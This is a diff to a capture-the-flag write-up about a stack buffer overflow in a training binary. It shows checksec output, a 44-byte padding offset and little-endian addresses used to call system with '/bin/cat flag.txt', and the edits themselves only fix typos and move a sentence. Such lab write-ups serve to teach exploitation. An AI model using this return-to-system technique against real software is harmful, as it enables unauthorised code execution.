@@ -3,7 +3,7 @@ The problem guides has told you that same as ret2win, there is a 0x20 buffer, wh
 
 But as in ret2win32, the buffer is actually 0x28 bytes.
 
-First, check the binarat security.
+First, check the binary security.
 ```
 gdb-peda$ checksec
 CANARY    : disabled
@@ -26,7 +26,7 @@ However, the syscall command is not "/bin/cat flag.txt", "but /bin/ls".
 ff ff
 ...
 ```
-Therefore, need to modify the command in the syscall, try to push "/bin/cat flag.txt" into the stack.
+Therefore, need to modify the command in the syscall, try to push "/bin/cat flag.txt" into stack.
 
 Use ghidra to find "/bin/cat flag.txt" in binary.
 ```
@@ -49,12 +49,12 @@ Same as ret2win32, buffer size is 0x28, and a rbp address, so the strings should
 strings = 'A'*40(40 bytes) + rbp(4 bytes) = 'A' * 44 //overflow 0x28 buffer and rbp register
 ```
 Then, we jump to the syscall address.
-we need to push the "/bin/cat flag.txt" address into stack, which will be used as syscall argument:
 ```
 '\x1a\x86\x04\x08' //syscall address
 ```
 Remember, we should directly jump to call system instruction. If we jump to the instruction right before it, the argument will be modified to "/bin/ls" again.
 
+we need to push the "/bin/cat flag.txt" address into stack, which will be used as syscall argument:
 ```
 '\x30\xa0\x04\x08' //the value we want to push into stack, and will be used as syscall argument. 
 ```
